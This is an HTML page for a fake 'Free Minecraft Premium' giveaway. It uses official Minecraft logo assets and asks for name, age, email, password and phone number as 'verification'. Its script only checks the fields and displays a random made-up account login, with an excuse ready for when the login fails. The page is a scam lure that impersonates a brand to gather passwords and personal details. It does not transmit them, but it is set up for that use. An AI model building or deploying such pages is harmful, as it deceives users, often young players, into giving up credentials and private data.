<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Free Minecraft Premium</title>
  <link rel="icon" href="https://www.minecraft.net/etc.clientlibs/minecraft/clientlibs/main/resources/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #171615;
      font-family: 'Segoe UI', Tahoma, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .form-box {
      background-color: #f3f3f3;
      padding: 40px;
      border-radius: 6px;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 0 10px rgba(0,0,0,0.4);
    }

    .form-box img {
      display: block;
      margin: 0 auto 25px;
      width: 180px;
    }

    h2 {
      text-align: center;
      color: #333;
      font-weight: normal;
    }

    p {
      text-align: center;
      color: #555;
      font-size: 14px;
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      font-size: 15px;
      border-radius: 4px;
      border: 1px solid #ccc;
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 15px;
      background-color: #00c300;
      border: none;
      color: white;
      font-size: 16px;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #00a000;
    }

    #result {
      margin-top: 20px;
      background: #fff;
      padding: 15px;
      border-radius: 4px;
      color: #222;
      display: none;
    }

    #result p {
      margin: 8px 0;
    }
  </style>
</head>
<body>
  <div class="form-box">
    <img src="https://www.minecraft.net/etc.clientlibs/minecraft/clientlibs/main/resources/logo.svg" alt="Minecraft">
    <h2>üéÅ Claim Your Minecraft Premium Account</h2>
    <p>Please provide your real information to verify eligibility.</p>

    <input type="text" id="name" placeholder="Full Name">
    <input type="number" id="age" placeholder="Age">
    <input type="email" id="email" placeholder="Email Address">
    <input type="password" id="password" placeholder="Password">
    <input type="tel" id="phone" placeholder="Phone Number">
    <button onclick="claimAcc()">Claim Now</button>

    <div id="result"></div>
  </div>

  <script>
    function claimAcc() {
      const name = document.getElementById("name").value.trim();
      const age = document.getElementById("age").value.trim();
      const email = document.getElementById("email").value.trim();
      const pass = document.getElementById("password").value.trim();
      const phone = document.getElementById("phone").value.trim();
      const result = document.getElementById("result");

      if (!name || !age || !email || !pass || !phone) {
        alert("Please fill in all fields!");
        return;
      }

      const accs = [
        "Steve_2001 | HeroCraft2025",
        "EnderSlayer | Nether!King123",
        "Diamond_PvP | pickaxeOP321",
        "BlockLord | redstoneMaster",
        "Herobrine88 | ghostcode666"
      ];

      const random = accs[Math.floor(Math.random() * accs.length)];

      result.style.display = "block";
      result.innerHTML = `
        <p><strong>‚úÖ Verification Complete!</strong></p>
        <p>Your Minecraft Premium Account:</p>
        <p><code>${random}</code></p>
        <p style="color:red;">‚ö†Ô∏è If it doesn't work, someone may have already claimed it!</p>
      `;
    }
  </script>
</body>
</html>
